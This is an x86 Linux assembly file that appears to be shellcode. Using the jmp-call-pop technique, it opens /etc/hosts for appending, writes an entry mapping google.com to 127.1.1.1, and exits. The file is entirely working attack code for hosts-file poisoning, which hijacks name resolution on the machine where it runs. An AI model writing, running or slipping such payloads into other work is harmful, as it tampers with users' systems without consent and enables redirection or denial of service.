global _start

section .text

_start:
    push ecx
    pop eax
    add al, 5

    push ecx

    jmp short _second
    
_hosts:
    pop ebx
    mov cx, 0x401
    int 0x80

    mov ebx, eax
    sub al, 3

    jmp short _load_data

_write:
    pop ecx
    mov dl, len
    int 0x80        ;syscall to write in the file

    push 1
    pop eax
    int 0x80        ;syscall to exit

_load_data:
    call _write
    google db "127.1.1.1 google.com"
    len equ $-google

_second:
    call _hosts
    host db "/etc/hosts"
